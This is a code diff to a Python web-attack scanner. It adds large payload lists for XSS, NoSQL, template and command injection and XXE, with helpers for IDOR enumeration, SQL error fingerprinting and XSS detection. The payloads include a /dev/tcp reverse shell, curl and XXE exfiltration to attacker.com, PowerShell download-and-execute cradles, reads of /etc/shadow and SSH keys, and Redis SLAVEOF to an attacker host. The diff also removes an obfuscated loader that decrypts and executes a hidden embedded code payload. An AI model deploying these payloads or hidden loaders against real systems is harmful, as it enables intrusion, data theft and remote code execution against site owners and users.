+        "<img src=x onerror=alert(1)>.gif", "';alert(1);//",
+        "\"><script>alert(1)</script>", "'-alert(1)-'",
+        "';window.alert(1);//", "javascript://%250Aalert(1)",
+    ],
+    "dom": [
+        "javascript:alert(document.domain)", "javascript:alert(document.cookie)",
+        "javascript:alert(window.name)", "javascript:alert(location.hash.substr(1))",
+        "<img src=x onerror=alert(document.domain)>",
+        "<svg onload=eval(location.hash.substr(1))>",
+        "#<img src=x onerror=alert(1)>",
+        "javascript:alert(document.referrer)",
+        "javascript:alert(document.URL)",
+        "javascript:alert(document.baseURI)",
+        "javascript:alert(window.location)",
+        "javascript:alert(document.documentElement.outerHTML)",
+        "<img src=x onerror=eval(location.hash.slice(1))>",
+        "<svg onload=fetch('/admin').then(r=>r.text()).then(t=>new Image().src='//x?a='+btoa(t)))>",
+        "javascript:document.write('<img src=x onerror=alert(1)>')",
+        "javascript:document.body.innerHTML='<img src=x onerror=alert(1)>'",
+    ],
+"mutation": [
+        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "<style><style /><img src=x onerror=alert(1)>",
+        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+        "<svg><p><style><g title=\"</style><img src=x onerror=alert(1)>\">",
+        "<noscript><g title=\"</noscript><img src=x onerror=alert(1)>\">",
+        "<form><button formaction=javascript:alert(1)>click",
+        "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'>",
+        "<xmp><img src=x onerror=alert(1)></xmp>",
+        "<noembed><img src=x onerror=alert(1)></noembed>",
+        "<noframes><img src=x onerror=alert(1)></noframes>",
+        "<style><img src=x onerror=alert(1)></style>",
+        "<table background='javascript:alert(1)'></table>",
+        "<a href=\"?payload=1\" onclick=alert(1)>x",
+        "<image src=x onerror=alert(1)>",
+        "<image src href=x onerror=alert(1)>",
+    ],
+"import": [
+        "<script import=\"https://x.example/x\"></script>",
+        "<link rel=import href=javascript:alert(1)>",
+        "<script src=javascript:alert(1)></script>",
+        "<script src=data:text/javascript,alert(1)></script>",
+        "<iframe src=javascript:alert(1)></iframe>",
+        "<object data=javascript:alert(1)></object>",
+        "<embed src=javascript:alert(1)>",
+        "<form action=javascript:alert(1)><input type=submit>",
+        "<isindex action=javascript:alert(1) type=submit>",
+        "<base href=javascript:alert(1)//>",
+    ],
+    "polyglot": [
+        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
+        "\"><svg/onload=alert(1)>", "'><svg/onload=alert(1)>",
+        "</title><svg/onload=alert(1)>", "</textarea><svg/onload=alert(1)>",
+        "</script><img src=x onerror=alert(1)>", "--><svg/onload=alert(1)>",
+        "`-alert(1)-`", "${alert(1)}", "{{constructor.constructor('alert(1)')()}}",
+    ],
+    "svg": [
+        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "<svg><set onbegin=alert(1) attributeName=x to=y>",
+        "<svg><foreignObject onload=alert(1)>", "<svg><use href=data:image/svg+xml,<svg id=x onload=alert(1)>#x>",
+        "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc>",
+        "<svg><a href=javascript:alert(1)>x</a>", "<svg onload=confirm(1)>",
+    ],
+    "csp": [
+        "<script nonce=anything>alert(1)</script>",
+        "<link rel=preload as=script href=javascript:alert(1)>",
+        "<iframe srcdoc='<script>alert(1)</script>'>",
+        "<object data=javascript:alert(1)>", "<embed src=javascript:alert(1)>",
+        "<base href=javascript:alert(1)//><a href=/test>click</a>",
+        "<form action=javascript:alert(1)><input type=submit>",
+    ],
+    "framework": [
+        "{{constructor.constructor('alert(1)')()}}",
+        "{{[].pop.constructor('alert(1)')()}}",
+        "{{$eval('alert(1)')}}", "{{7*7}}",
+        "${alert(1)}", "<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>",
+        "<img src=x v-on:error=alert(1)>", "<template><img src=x onerror=alert(1)></template>",
+    ],
+}
 
-def _load_code() -> object:
-    if sys.version_info[:2] != (EXPECTED_MAJOR, EXPECTED_MINOR):
-        raise SystemExit(
-            "هذه النسخة المحمية تحتاج بايثون "
-            f"{EXPECTED_MAJOR}.{EXPECTED_MINOR} بالضبط."
-        )
+NOSQL = {
+    "mongo": [
+        "{'$ne': null}", "{'$gt': ''}", "{'$regex': '.*'}", "{'$where': '1==1'}",
+        "admin' || '1'=='1", "admin' && this.password.match(/.*/)//",
+        "username[$ne]=x&password[$ne]=x", "username[$regex]=.*&password[$regex]=.*",
+        "{\"$or\":[{}, {\"a\":\"a\"}]}", "{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
+        "{\"username\":\"admin\",\"password\":{\"$gt\":\"\"}}",
+        "{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}",
+        "{\"username\":{\"$gt\":\"\"},\"password\":{\"$gt\":\"\"}}",
+        "[$ne]=1", "[$gt]=", "[$regex]=.*", "[$exists]=true",
+        "[$where]=this.password.match(/.*/)",
+        "[$mod]=1", "[$nin]=", "[$in]=[\"admin\"]",
+        "{\"$and\":[{\"username\":\"admin\"},{\"password\":{\"$ne\":\"\"}}]}",
+        "{\"$or\":[{\"username\":\"admin\"},{\"password\":{\"$ne\":\"\"}}]}",
+        "{\"$nor\":[{\"username\":\"invalid\"},{\"password\":\"invalid_pass\"}]}",
+        "username=admin&password[$ne]=wrong",
+        "username=admin&password[$regex]=^(a|b|c)",
+        "username=admin&password[$gt]=ZZZZ",
+        "[$type]=string", "[$eq]=", "[$lte]=z",
+    ],
+    "javascript": [
+        "'; return true; var x='", "'; return this.username == 'admin'; var x='",
+        "'||'1'=='1", "'||sleep(3000)||'", "'; while(true){}; var x='",
+        "1;return true", "1;return this.password==this.password",
+        ";var date=current_date();return date>0 //'",
+        "';return this.role=='admin' //'",
+        "';return 'admin'=='admin' //'",
+        "';return true //' || '1'=='1",
+        "'||this.username.match(/./)//",
+        "';return this.constructor.constructor('return 1')()//",
+        "';return global.process.mainModule.require('fs').readdirSync('/')//",
+    ],
+    "redis": [
+        "CONFIG GET *", "*1\r\n$7\r\nCONFIG\r\n$3\r\nGET\r\n$1\r\n*\r\n",
+        "EVAL \"return 1\" 0", "FLUSHALL", "KEYS *",
+        "GET user:admin", "SET hack 'evil' 0",
+        "SLAVEOF attacker.com:6379",
+        "DEBUG SET-ACTIVE-EXPIRE 0",
+    ],
+    "cassandra": [
+        "' OR '1'='1; --", "admin' ALLOW FILTERING; --",
+        "' ; DROP TABLE users; --", "' UNION SELECT * FROM system_schema.tables; --",
+    ],
+}
 
-    seed = "".join(SEED_PARTS).encode("utf-8")
-    salt = bytes.fromhex(SALT_HEX)
-    encrypted = base64.b85decode(PAYLOAD.encode("ascii"))
-    stream = _keystream(
-        len(encrypted),
-        hashlib.blake2s(seed + salt, digest_size=32).digest(),
-    )
-    packed = _xor_bytes(encrypted, stream)
-    pyc_bytes = zlib.decompress(packed)
-    return marshal.loads(pyc_bytes[16:])
+SSTI = {
+    "generic": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "${{7*7}}", "{{7*'7'}}"],
+    "jinja2": [
+        "{{config}}", "{{self}}", "{{request}}", "{{''.__class__.__mro__[1].__subclasses__()}}",
+        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+        "{{joiner.__init__.__globals__.os.popen('whoami').read()}}",
+        "{{config.items()} }", "{{namespace}}", "{{g}}",
+        "{{url_for.__globals__.__builtins__.eval('1+1')}}",
+        "{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}",
+        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+        "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+    ],
+    "twig": ["{{_self}}", "{{dump(app)}}", "{{['id']|filter('system')}}", "{{'/etc/passwd'|file_excerpt(1,30)}}"],
+    "freemarker": ["${7*7}", "${.version}", "${'freemarker.template.utility.Execute'?new()('id')}"],
+    "velocity": ["#set($x=7*7)$x", "#set($e='e')${e}", "#evaluate('7*7')"],
+    "mako": ["${7*7}", "${self.module.cache.util.os.popen('id').read()}"],
+    "pebble": ["{{7*7}}", "{{%s}}", "%{7*7}"],
+    "smarty": ["{7*7}", "{system('id')}"],
+    "thymeleaf": ["__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x", "*{T(java.lang.Runtime).getRuntime().exec('id')}"],
+    "ejs": ["<%=7*7%>", "<%=process.mainModule.require('fs').readFileSync('/etc/passwd')%>"],
+    "nunjucks": ["{{7*7}}", "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"],
+    "pugjs": ["#{7*7}", "#{global.process.mainModule.require('child_process').execSync('id')}"],
+    "tornado": ["{{7*7}}", "{%import os%}{{os.popen('id').read()}}"],
+    "erb": ["<%= 7*7 %>", "<%= system('id') %>", "<%= `id` %>"],
+    "smarty_secure": ["{7*7}", "{php}system('id');{/php}", "{if system('id')}{/if}"],
+}
 
+CMDI = {
+    "unix": [
+        ";id", "|id", "&&id", "||id", "`id`", "$(id)", ";whoami", "|whoami",
+        ";cat /etc/passwd", "|cat /etc/passwd", "&& sleep 3", "| sleep 3",
+        ";nslookup attacker.com", "|curl http://attacker.com/$(whoami)",
+        "%0aid", "%0did", "%0aid%0a", "%0did%0d",
+        "%0aid;", "%0did|", "%0a&&id",
+        ";cat${IFS}/etc/passwd", "${IFS}id", ";$IFS id",
+        ";\ttid", "|\twhoami",
+        ";id -u", "|grep uid",
+        "$({id})", "$(`id`)",
+        ";a=id;$a", ";x=id;${x}",
+        ";id -u|mail -s x root",
+        ";cat</etc/passwd", "{id,}", "{cat,/etc/passwd}",
+        ";{cat,/etc/passwd}",
+        ";exec<&0;exec>&1;sh -i",
+        ";sh -i >& /dev/tcp/127.0.0.1/4444 0>&1",
+        "|bash -c 'id'",
+        ";bash -c id",
+        ";/bin/sh -c id", "|env",
+        ";echo cGlkZA==|base64 -d",
+        ";printf 'id'|sh", "|echo id|sh",
+        ";IFS=,;a=cat,/etc/passwd;$a",
+        "|{cat,/etc/passwd}",
+        ";id #", ";id|||echo ok",
+    ],
+    "windows": [
+        "& whoami", "| whoami", "&& whoami", "& dir", "| dir", "& ping -n 4 127.0.0.1",
+        "& type C:\\Windows\\win.ini", "| powershell -c whoami",
+        "& net user", "| net localgroup administrators",
+        "& ipconfig /all", "| ipconfig",
+        "& tasklist", "| tasklist | findstr cmd",
+        "& systeminfo", "| ver",
+        "& wmic os get", "| wmic useraccount list",
+        "& wmic service get", "& quser",
+        "& query user", "| query session",
+        "& taskkill /PID 1234 /F",
+        "& sc query", "| sc query state= all",
+        "& schtasks /query", "& netstat -an",
+        "& route print", "& arp -a",
+        "& nslookup whoami.example.com",
+        "& powershell -enc dwBoAG8AYQBtAGkA",
+        "& powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://x/x.ps1')",
+        "& certutil -urlcache -split -f http://x/x.exe C:\\x.exe",
+        "& bitsadmin /transfer x http://x/x C:\\x.exe",
+        "& whoami /all", "& whoami /groups",
+        "& whoami /priv", "& whoami /upn",
+        "& dir C:\\Users\\ /s /b",
+        "& type C:\\Users\\Public\\test.txt",
+        "& cmd /c whoami", "| cmd /c whoami",
+        "& for /F %i in (users.txt) do echo %i",
+        "& wmic bios get serialnumber",
+    ],
+    "waf": [
+        "%3bid", "%7cid", "%26%26id", "%60id%60", "%24%28id%29",
+        ";${IFS}id", "|${IFS}id", "&&${IFS}whoami", "cat${IFS}/etc/passwd",
+        "%3Bwhoami", "%7Cwhoami", "%26whoami",
+        ";$(whoami)", "|$(whoami)",
+        "%0Awhoami", "%0Dwhoami", "%0A%0Dwhoami",
+        "%2 id", "%2Cid", "%1Bwhoami",
+        ";${IFS}cat${IFS}${IFS}/etc/passwd",
+        "%3B%24%28cat${IFS}%2Fetc%2Fpasswd%29",
+        "%3Bcat%20/etc/passwd",
+        "%7Ccat${IFS}%2Fetc%2Fpasswd",
+        "%26%26cat%20%2Fetc%2Fpasswd",
+        "%3Ccat%20%2Fetc%2Fpasswd",
+        "%2 2whoami",
+        ";$IFS$cat$IFS$passwd",
+        "%24{IFS}cat${IFS}%2Fetc%2Fpasswd",
+    ],
+}
 
-def main() -> None:
-    code = _load_code()
-    globals_dict = {
-        "__name__": "__main__",
-        "__file__": ENTRY_NAME,
-        "__package__": None,
-        "__cached__": None,
+XXE = {
+    "file": [
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///c:/windows/win.ini'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/shadow'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///etc/hosts'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///var/log/apache2/access.log'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///var/www/html/.env'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///app/.env'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///home/user/.ssh/id_rsa'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///root/.ssh/id_rsa'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'file:///c:/inetpub/wwwroot/web.config'>]><x>&xxe;</x>",
+    ],
+    "oob": [
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % xxe SYSTEM 'http://attacker.com/xxe.dtd'>%xxe;]><x/>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'http://attacker.com/?d=xxe'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % d SYSTEM 'http://attacker.com/evil.dtd'>%d;]><x/>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'ftp://attacker.com/file'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'gopher://attacker.com:25/x'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % a SYSTEM 'file:///etc/passwd'><!ENTITY % b SYSTEM 'http://attacker.com/?d=%a;'>%b;]><x/>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'expect://id'>]><x>&xxe;</x>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=index.php'>]><x>&xxe;</x>",
+    ],
+    "billion_laughs": [
+        "<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;'>]><lolz>&lol2;</lolz>",
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY a 'XXXXXXXXXX'><!ENTITY b '&a;&a;&a;&a;&a;'>]><x>&b;</x>",
+    ],
+    "parameter": [
+        "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'><!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?d=%file;\">'>%dtd;%eval;%exfil;]><x/>",
+    ],
+}
+
+def payload_stats():
+    return {
+        "sqli": sum(len(v) for v in SQLI.values()),
+        "xss": sum(len(v) for v in XSS.values()),
+        "nosql": sum(len(v) for v in NOSQL.values()),
+        "ssti": sum(len(v) for v in SSTI.values()),
+        "cmdi": sum(len(v) for v in CMDI.values()),
+        "xxe": sum(len(v) for v in XXE.values()),
     }
-    exec(code, globals_dict)
 
+def all_payloads():
+    out=[]
+    for group,db in [("SQLI",SQLI),("XSS",XSS),("NOSQL",NOSQL),("SSTI",SSTI),("CMDI",CMDI),("XXE",XXE)]:
+        for cat,items in db.items():
+            for p in items:
+                out.append({"group":group,"category":cat,"payload":p})
+    return out
 
-if __name__ == "__main__":
-    main()
+IDOR_NAMES=["id","user_id","uid","account_id","profile_id","order_id","doc_id","file_id",
+    "item_id","pid","cid","post_id","page_id","cat_id","group_id","member_id","record_id",
+    "transaction_id","invoice_id","ticket_id","message_id","comment_id","attachment_id",
+    "report_id","project_id","task_id","event_id","booking_id","subscription_id","payment_id",
+    "customer_id","client_id","employee_id","staff_id","admin_id","role_id","permission_id",
+    "resource_id","document_id","image_id","video_id","media_id","album_id","folder_id",
+    "session_id","token_id","key_id","api_key","secret_id","config_id","setting_id",
+    "log_id","audit_id","notification_id","campaign_id","ad_id","store_id","product_id",
+    "category_id","tag_id","review_id","rating_id","vote_id","survey_id","form_id",
+    "field_id","entry_id","submission_id","export_id","import_id","batch_id","job_id",
+    "queue_id","worker_id","node_id","cluster_id","server_id","instance_id","container_id",
+    "deployment_id","build_id","release_id","version_id","environment_id","tenant_id",
+    "org_id","organization_id","team_id","department_id","branch_id","warehouse_id",
+    "location_id","address_id","contact_id","phone_id","email_id","website_id","social_id"]
+
+IDOR_HEADERS=["X-User-Id","X-User-ID","X-Account-Id","X-Member-Id","X-Profile-Id",
+    "X-Client-Id","X-Customer-Id","X-Tenant-Id","X-Organization-Id","X-Company-Id",
+    "X-Requester-Id","X-Auth-User-Id","X-Current-User-Id","X-Session-User-Id",
+    "X-Api-User-Id","X-Real-User-Id","X-Effective-User-Id","X-Actor-Id",
+    "X-Object-Id","X-Resource-Id","X-Entity-Id","X-Document-Id","X-Record-Id",
+    "X-Forwarded-User-Id","X-Remote-User-Id","X-Original-User-Id"]
+
+UUID_V4_RE=re.compile(r'[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}',re.IGNORECASE)
+PATH_ID_RE=re.compile(r'/(\d{1,20})(?:/|$|\?|#|;)')
+PATH_UUID_RE=re.compile(r'/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12})(?:/|$|\?|#|;)',re.IGNORECASE)
+PATH_HASH_RE=re.compile(r'/([a-f0-9]{16,64})(?:/|$|\?|#|;)',re.IGNORECASE)
+API_PATH_RE=re.compile(r'(/api(?:|/v\d+)/[^\s?]+)',re.IGNORECASE)
+
+def similarity(a,b):
+    if not a or not b: return 0.0
+    la=len(a); lb=len(b)
+    mx=max(la,lb)
+    if mx==0: return 1.0
+    eq=sum(1 for x,y in zip(a,b) if x==y)
+    return eq/mx
+
+def content_hash(ct):
+    ct2=re.sub(r'<[^>]+>','',ct)
+    ct2=re.sub(r'\s+','',ct2).lower()
+    return hashlib.md5(ct2.encode()).hexdigest()
+
+def extract_structure(ct):
+    tags=re.findall(r'<(\w+)[^>]*>',ct)
+    attrs=set()
+    for m in re.finditer(r'(\w+)=["\'][^"\']*["\']',ct):
+        attrs.add(m.group(1))
+    return tags,attrs
+
+def is_error_page(ct,status):
+    if status>=400: return True
+    err_kws=["error","not found","does not exist","no results","unauthorized",
+              "forbidden","access denied","invalid","expired","no data",
+              "404","403","401","something went wrong","page not found",
+              "resource not found","not available","no record","no matching"]
+    cl=ct.lower()
+    return sum(1 for w in err_kws if w in cl)>=3
+
+def is_data_page(ct,status):
+    ok_kws=["email","phone","address","name","username","price","amount",
+            "date","time","description","title","avatar","profile","photo",
+            "balance","account","order","invoice","total","status","role",
+            "company","department","salary","ssn","card","bank"]
+    cl=ct.lower()
+    hits=sum(1 for w in ok_kws if w in cl)
+    if status==200 and hits>=3 and len(ct)>500: return True
+    if hits>=5 and len(ct)>1000: return True
+    return False
+
+def gen_uuid():
+    return "%08x-%04x-4%03x-%04x-%012x"%(
+        random.randint(0,0xffffffff),random.randint(0,0xffff),
+        random.randint(0,0xfff),random.randint(0,0xffff)|0x8000,
+        random.randint(0,0xffffffffffff))
+
+def gen_test_ids(original=None):
+    ids=["0","1","2","3","-1","999999","0001","100","1337","1000",
+         "1001","9999","10000","100000","2147483647","4294967295"]
+    if original and original.isdigit():
+        n=int(original)
+        for d in [-1,1,-2,2,5,10,50,100]:
+            v=n+d
+            if v>=0 and str(v) not in ids: ids.append(str(v))
+        random.shuffle(ids)
+        ids=ids[:20]
+    return ids
+
+def gen_test_uuids(original=None):
+    uuids=[]
+    if original:
+        parts=original.split("-")
+        if len(parts)==5:
+            for i in range(3):
+                np=list(parts)
+                idx=random.randint(0,4)
+                np[idx]="%08x"%random.randint(0,0xffffffff) if idx==0 else \
+                         "%04x"%random.randint(0,0xffff) if idx in [1,2,3] else \
+                         "%012x"%random.randint(0,0xffffffffffff)
+                uuids.append("-".join(np))
+    for _ in range(5): uuids.append(gen_uuid())
+    return uuids
+
+def gen_encoded(val):
+    encs=[]
+    try: encs.append(base64.b64encode(val.encode()).decode())
+    except: pass
+    try: encs.append(base64.urlsafe_b64encode(val.encode()).decode())
+    except: pass
+    try: encs.append(base64.b16encode(val.encode()).decode())
+    except: pass
+    try: encs.append(val.encode().hex())
+    except: pass
+    try: encs.append(urllib.parse.quote(val))
+    except: pass
+    try: encs.append(base64.b32encode(val.encode()).decode())
+    except: pass
+    return encs
+
+def detect_api_paths(url):
+    found=[]
+    ps=urlparse(url)
+    path=ps.path
+    for m in API_PATH_RE.finditer(url):
+        found.append(m.group(1))
+    parts=path.split("/")
+    for i,p in enumerate(parts):
+        if p.lower() in ["api","rest","graphql","v1","v2","v3","v4","endpoint"]:
+            base="/".join(parts[:i+2]) if i+2<=len(parts) else "/".join(parts[:i+1])
+            found.append(base)
+    return list(set(found))
+
+ERR_PAT = [
+    (r"SQL syntax.*MySQL","MySQL"),(r"Warning.*mysql_.*","MySQL"),
+    (r"MySqlClient\.","MySQL (.NET)"),(r"PostgreSQL.*ERROR","PostgreSQL"),
+    (r"Warning.*\Wpg_.*","PostgreSQL"),(r"Npgsql\.","PostgreSQL (.NET)"),
+    (r"Driver.*SQL SERVER","MSSQL"),(r"OLE DB.*SQL SERVER","MSSQL"),
+    (r"Microsoft SQL Native Client error","MSSQL"),
+    (r"Oracle error","Oracle"),(r"Oracle.*Driver","Oracle"),
+    (r"Warning.*\Woci_.*","Oracle"),(r"Warning.*\Wora_.*","Oracle"),
+    (r"SQLite/JDBCDriver","SQLite"),(r"sqlite3.OperationalError","SQLite"),
+    (r"DB2 SQL error:","DB2"),(r"CLI Driver.*DB2","DB2"),
+    (r"Unclosed quotation mark","MSSQL/MySQL"),
+    (r"SQL command not properly ended","Oracle"),
+    (r"syntax error","Generic SQL"),(r"incorrect syntax near","MSSQL"),
+    (r"ORA-[0-9]{5}","Oracle"),(r"Database error","Generic SQL"),
+    (r"SQL error","Generic SQL"),(r"mysql_fetch","MySQL"),
+    (r"pg_query","PostgreSQL"),(r"mssql_query","MSSQL"),
+    (r"SQLSTATE\[\d+\]","Generic SQL"),(r"column .* does not exist","PostgreSQL"),
+    (r"unknown column","MySQL"),(r"no such column","SQLite"),
+    (r"Microsoft OLE DB Provider","MSSQL"),(r"ODBC SQL Server Driver","MSSQL"),
+    (r"SQL Server.*[Ee]rror","MSSQL"),
+    (r"ODBC.*SQL.*Driver","MSSQL/MySQL"),(r"Unclosed quotation mark after the character string","MSSQL"),
+    (r"syntax error at line","Generic SQL"),
+    (r"in.*line.*at.*里程.*query","Generic SQL"),
+    (r"You have an error in your SQL syntax","MySQL"),
+    (r"MySQLSyntaxErrorException","MySQL (Java)"),
+    (r"org\.mysql.*Exception","MySQL (Java)"),
+    (r"com\.mysql.*Exception","MySQL (Java)"),
+    (r"org\.postgresql.*Exception","PostgreSQL (Java)"),
+    (r"org\.postgresql\.util\.PSQLException","PostgreSQL"),
+    (r"org\.hibernate.*Exception","Hibernate/Generic"),
+    (r"h2\.SQLException","H2 Database"),(r"JDBCExceptionReporter","Generic JDBC"),
+    (r"jQuery.*SQL.*Exception","Generic SQL"),
+    (r"Exception.*System\.Data\.SqlClient","MSSQL (.NET)"),
+    (r"MySqlConnector.*Exception","MySQL (.NET)"),
+    (r"Npgsql.*Exception","PostgreSQL (.NET)"),
+    (r"System\.Data\.SQLite","SQLite (.NET)"),
+    (r" raised ","Generic Framework"),
+    (r"PG::.*Error","PostgreSQL (Rails)"),
+    (r"Mysql2::Error","MySQL (Rails)"),
+    (r"ActiveRecord::StatementInvalid","Rails/SQL"),
+    (r"Doctrine.*ORM.*Exception","Doctrine/SQL"),
+    (r"sqlite3.OperationalError:","SQLite (Python)"),
+    (r"psycopg2.*Error","PostgreSQL (Python)"),
+    (r"_mysql_connector.*Error","MySQL (Python)"),
+    (r"pyodbc.*ProgrammingError","MSSQL (Python)"),
+    (r"division by zero","PostgreSQL/Oracle"),
+    (r"value too long for type","PostgreSQL"),
+    (r"Data too long for column","MySQL"),
+    (r"String or binary data would be truncated","MSSQL"),
+    (r"integer value out of range","PostgreSQL"),
+    (r"SQL command not properly ended","Oracle"),
+    (r"ORA-\d{5}","Oracle"),
+    (r"ORA-\d{4}:","Oracle"),
+    (r"PLS-\d{5}","Oracle"),
+    (r"SP2-\d{4}","Oracle"),
+    (r"ORA-\d{5}:","Oracle"),
+    (r"Invalid column name","MSSQL"),
+    (r"Subquery returns more than 1 row","MySQL/MSSQL"),
+    (r"single-row subquery returns","Oracle"),
+    (r"GROUP BY is missing","DB2"),
+    (r"deadlocked","MSSQL locking"),
+    (r"unique constraint","Generic SQL"),
+    (r"foreign key constraint","Generic SQL"),
+    (r"cannot delete.*constraint","Generic SQL"),
+    (r"command not allowed","Generic SQL safe-update"),
+    (r"you must specify at least one value","MySQL INSERT"),
+    (r"integrity.*constraint.*violation","Generic SQL"),
+    (r"sqlsrv_query","MSSQL (PHP)"),
+    (r"ibase_query","Firebird"),
+    (r"odbc_exec","ODBC Generic"),
+    (r"Error Executing Database Query","ColdFusion"),
+    (r"SQLSTATE\[42000\]","Generic SQL syntax"),
+    (r"SQLSTATE\[42001\]","Generic SQL syntax"),
+    (r"SQLSTATE\[42702\]","PostgreSQL ambiguous column"),
+    (r"SQLSTATE\[42703\]","PostgreSQL undefined column"),
+    (r"Microsoft SQL Server.*Native Client","MSSQL"),
+    (r"Incorrect syntax near","MSSQL"),
+    (r"Incomplete client information","MSSQL"),
+    (r"Unclosed quotation mark","MSSQL/MySQL"),
+    (r"warning: pg_connect","PostgreSQL"),
+    (r"odbc_connect","ODBC"),
+    (r"odbc_pconnect","ODBC persistent"),
+    (r"ORA-00942:","Oracle table not found"),
+    (r"ORA-01756:","Oracle quoted string"),
+    (r"ORA-00936:","Oracle missing expression"),
+    (r"ORA-00911:","Oracle invalid character"),
+    (r"mongodb.*Error","MongoDB"),
+    (r"MongoError","MongoDB"),
+    (r"BSON.*Error","MongoDB"),
+    (r"E11000","MongoDB duplicate key"),
+    (r"$where.*not allowed","MongoDB $where"),
+    (r"ObjectId.*not valid","MongoDB ObjectId"),
+    (r"Redis.*WRONGTYPE","Redis"),
+    (r"Could not connect to Redis","Redis"),
+    (r"wrong number of arguments for 'get' command","Redis"),
+]
+
+XSS_PAT = [
+    (r"<script>alert\(1\)</script>","Reflected Script"),
+    (r"<script>alert\('XSS'\)</script>","Reflected Script"),
+    (r"<img src=x onerror=alert\(1\)>","IMG OnError"),
+    (r"<svg onload=alert\(1\)>","SVG OnLoad"),
+    (r"<body onload=alert\(1\)>","Body OnLoad"),
+    (r"javascript:alert\(1\)","JavaScript URI"),
+    (r"<iframe","IFrame Injection"),(r"<embed","Embed Injection"),
+    (r"<object","Object Injection"),
+    (r"onerror=","Event Handler"),(r"onload=","Event Handler"),
+    (r"onmouseover=","Event Handler"),(r"onfocus=","Event Handler"),
+    (r"onclick=","Event Handler"),(r"onsubmit=","Event Handler"),
+    (r"ontoggle=","Event Handler"),(r"onstart=","Event Handler"),
+    (r"alert\(1\)","Alert Reflected"),
+    (r"alert\(document\.domain\)","Domain Leak"),
+    (r"alert\(document\.cookie\)","Cookie Leak"),
+    (r"fetch\(","Fetch Reflected"),(r"document\.location","Redirect Reflected"),
+    (r"document\.cookie","Cookie Reflected"),(r"eval\(","Eval Reflected"),
+    (r"<marquee","Marquee Tag"),(r"<details","Details Tag"),
+    (r"<video","Video Tag"),(r"<audio","Audio Tag"),
+    (r"<button","Button Tag"),(r"<textarea","Textarea Tag"),
+    (r"<select","Select Tag"),(r"<keygen","Keygen Tag"),
+    (r"\\x61lert","Hex Encoded Alert"),(r"\\u0061lert","Unicode Encoded Alert"),
+    (r"alert&#40;","HTML Entity Alert"),(r"alert&#x28;","Hex Entity Alert"),
+    (r"<script>","Script Tag"),(r"</script>","Script Closing Tag"),
+    (r"<script[^>]+src=","External Script Load"),
+    (r"<svg[^>]+onload=","SVG Event Handler"),
+    (r"<svg[^>]+onmouseover=","SVG Hover Handler"),
+    (r"<input[^>]+onfocus=","Input Focus Handler"),
+    (r"<input[^>]+onblur=","Input Blur Handler"),
+    (r"<a[^>]+href=\"javascript:","JS URI in Anchor"),
+    (r"<a[^>]+href='javascript:","JS URI in Anchor"),
+    (r"<a[^>]+href=javascript:","JS URI in Anchor"),
